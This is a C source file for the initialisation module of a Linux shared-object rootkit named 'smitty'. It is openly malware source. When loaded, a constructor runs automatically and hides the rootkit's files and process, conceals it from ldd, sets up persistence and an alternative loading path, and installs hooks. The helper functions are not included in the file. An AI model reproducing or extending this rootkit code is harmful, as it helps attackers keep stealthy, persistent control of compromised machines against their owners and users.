#include "smitty.h"

smitty_context_t g_smitty_ctx = {0};

void smitty_init(void) {
    if (g_smitty_ctx.initialized) {
        return;
    }
    
    g_smitty_ctx.magic = SMITTY_MAGIC;
    strncpy(g_smitty_ctx.version, SMITTY_VERSION, sizeof(g_smitty_ctx.version) - 1);
    
    getcwd(rootkit_path, sizeof(rootkit_path));
    strcat(rootkit_path, "/smitty.so");
    
    generate_random_path(random_hide_path);
    
    add_hidden_file("smitty.so");
    add_hidden_file("smitty");
    add_hidden_file(random_hide_path);
    add_hidden_process("smitty", getpid());
    
    hide_from_ldd();
    setup_persistence();
    create_alternative_loading();
    
    init_hooks();
    
    g_smitty_ctx.initialized = 1;
}

void smitty_cleanup(void) {
    if (!g_smitty_ctx.initialized) {
        return;
    }
    
    remove_hidden_file("smitty.so");
    remove_hidden_file("smitty");
    remove_hidden_file(random_hide_path);
    remove_hidden_process("smitty");
    
    g_smitty_ctx.initialized = 0;
    g_smitty_ctx.magic = 0;
}

int smitty_is_initialized(void) {
    return g_smitty_ctx.initialized && g_smitty_ctx.magic == SMITTY_MAGIC;
}

void __attribute__((constructor)) smitty_constructor(void) {
    smitty_init();
}

void __attribute__((destructor)) smitty_destructor(void) {
    smitty_cleanup();
}
